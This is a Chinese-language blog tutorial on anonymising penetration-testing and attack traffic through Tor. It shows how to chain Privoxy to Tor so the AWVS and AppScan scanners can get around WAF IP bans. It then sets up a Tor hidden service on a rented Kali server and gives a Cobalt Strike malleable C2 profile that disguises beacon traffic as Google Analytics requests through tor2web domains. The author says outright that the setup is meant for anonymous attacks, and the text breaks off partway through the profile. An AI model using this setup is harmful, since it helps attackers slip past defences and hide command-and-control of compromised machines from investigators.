1.前言

（该文章仅用于技术研究，请勿用于非法用途。对于产生的任何风险及违法问题不承担任何责任）本来还是Bypass WAF的 成功被举报，所以灌水一波

在渗透测试中我们扫描、爆破、注入的时候，会遇到很多WAF之类的拦截、封禁我们的IP。通常这种情况下我们都会去使用类似“黑洞”之类的IP代理池去实现绕过，或不停的切换VPN，“繁琐”的过程降低了工作的效率。而我们的TOR可以在我们实现一些操作的时候同时保持请求的匿名,且非常的简单，非常的有效。当然我们还可以利用TOR做一些隐藏匿名攻击的操作。所以就有了基于TOR代理的这篇文章，内容都是前人发布过的，这里只是做了一些整合。

3.AWVS和APPscan使用tor代理扫描

3.1   Privoxy

Window平台下直接从官网下载安装包

（http://www.silvester.org.uk/privoxy/Windows/3.0.23/ ）这里的安装目录为：C:\Program Files (x86)\Privoxy，安装好后打开目录下的config.txt，添加如下配置项：

forward-socks5/ localhost:9050 .

此时重启Privoxy即可。这里需要注意的是，Privoxy默认使用的是8118端口。

3.2   AWVS配置代理

打开https://localhost:3443/#/proxy-settings

选择Proxy Settings → Enable

 

 

3.3   APPSCAN配置代理

AppScan配置代理，在新建扫描时输入起始URL后，选择对话框下方的“我需要配置其他连接设置”，再点击下一步即可进入代理配置界面


在下一步中，选择“使用定制代理设置”，然后输入自己的代理监听地址即可。

6.基于tor的cobalt strike高匿名攻击

首先需要外网的一台主机

这里我选用的是VULTR

https://www.vultr.com/

安装自定义的ISO镜像 本文中使用的是kali

先安装tor

apt-get install-y tor

接着修改Tor的配置文件

假设你已经安装好了Tor，下面进项相关的配置

vi/etc/tor/torrc

去掉标注的两项#注释。并且修改将127.0.0.1的端口修改为8080，就是将本地8080端口转发到80端口上


保存文件，重启tor服务

service tor restart

当tor重启后，会创建一个私钥在你的/var/lib/tor/hidden_service/目录，同时创建你的独一无二的.onion 主机名

 


使用python 简易webserver测试

Python2.7python -m SimpleHTTPServer 8080

Python3.xpython -m http.server 8080

本地使用tor浏览器访问我们的onion域名测试

然后解决 tor 访问问题，默认情况下tor 是必须要洋葱浏览器访问的

可以通过使用tor2web功能网站去实现普通浏览器访问

这里使用的是https://onion.ws/

他会自动的使用ssl来加密我们的域名


同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下：

tor-fronting.profile

# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker
# Modified by Vincent Yiu @vysecurity for TOR.


set sleeptime "5000";


http-get {
        set uri"/___utm";
        client{
               header "Host" "xxx.onion.ws";


               metadata {
                        base64url;
                        prepend"__utma";
                        parameter"utmcc";
               }
        }


        server{
               header "Content-Type" "plain/text";


               output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 3839 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 0002 01 44 00 3b
                        prepend"\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend"\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                       prepend"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";


                        print;
               }
        }
}


http-post {
        set uri"/__utm";
        setverb "GET";
        client{
               header "Host" "xxx.onion.cab";


               id {
                        prepend"UA-220";
                        append "-2";
                        parameter"utmac";
               }


               output {
                        base64url;
                       prepend "__utma";
                        parameter"utmcc";
               }
        }


        server{
               header "Content-Type" "plain/text";


               output {
                        prepend"\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
